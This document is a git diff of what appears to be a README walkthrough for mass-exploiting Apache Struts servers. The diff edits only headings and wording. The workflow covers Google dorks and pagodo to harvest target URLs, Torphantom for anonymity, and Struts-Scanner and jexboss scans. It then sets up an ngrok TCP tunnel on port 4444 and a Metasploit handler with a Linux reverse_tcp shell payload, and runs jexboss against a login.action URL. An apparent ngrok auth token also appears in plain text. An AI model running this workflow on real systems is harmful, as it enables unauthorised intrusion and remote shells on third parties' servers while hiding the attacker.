@@ -20,6 +20,8 @@ com.opensymphony.xwork2.inject.ContainerImpl@d0d2b00
 ~~~
 ![img-sample](https://www.synopsys.com/blogs/software-security/wp-content/uploads/HTTPRequestWithCurl.png)
 
+The curl command shown above demonstrates whether the server is vulnerable or not by sending an http request with an embedded OGNL expression in the Content-Type header and receiving a response.
+
 ## FIND POTENTIAL TARGETS
 
 intitle:"Struts problem report" intext:"Struts has detected an Unhandled"
@@ -51,57 +53,39 @@ git clone https://github.com/3ndG4me/torphantom.git
 ~~~
 
 ## Optional
-Save your dorks list into a file such as "dorks.txt"
-Specify the output path and filename such as "urls.txt"
+Save your dorks list into a file such as "dorks.txt" and Specify the output path and filename such as "urls.txt"
 ~~~bash
 $ sudo python pagodo.py ­-g dorks.txt ­-l 200 ­-s ­-e 35.0 ­-j 1.1 >> urls.txt
 ~~~
 
-## INITIALIZE TOR SESSION
-Start Torphantom
-
+## INITIALIZE TOR SESSION WITH TORPHANTOM
 ###  Type the below commands
-
 ~~~bash
 $ sudo torphantom start ­-i <interface>
 ~~~
 
-Scan using Struts-Scanner
-
-### Type the below commands and follow up the screen prompt
+### Scan using Struts-Scanner
+Type the below commands and follow up the screen prompt
 ~~~bash
 $ ./struts­-scanner
 ~~~
-
-Scan using Jexboss
-
-### Type the below commands after correcting the input and output file paths
+Type the below commands after correcting the input and output file paths
 ~~~bash
 $ python jexboss.py ­-mode -file­-scan -­file /path/file/urls.txt ­-out /path/output/results.log ­­--struts2
 ~~~
 
-## INITIALIZE TCP TUNNELING
-
-Start Ngrok
-
-###  Your Token can be found in your Ngrok account
-
+## INITIALIZE TCP TUNNELING WITH NGROK
 ~~~bash
 $ ./ngrok authtoken 8ml78jQFrVNah4cN8UwTt_5ZVZYRPD8q7huTk7vo8MZ
 ~~~
+*Your Token can be found in your Ngrok account*
 
-Create the Session
-
-### Create the Ngrok session on the port 4444 using the below command
+Create the Ngrok session on the port 4444 using the below command
 ~~~bash
 $ ./ngrok tcp 4444
 ~~~
 
 ## CREATE MSF HANDLER
-
-Start Metasploit
-
-### Open Metasploit
 ~~~bash
 $ msfconsole
 $ msf > use exploit/multi/handler
@@ -111,7 +95,6 @@ $ msf exploit(multi/handler) > set PAYLOAD linux/x86/shell/reverse_tcp PAYLOAD =
 ~~~
 
 ## EXPLOIT THE TARGET
-Jexboss Commands
 ~~~bash
 $ sudo python jexboss.py -u http://example.com/login.action
 ~~~
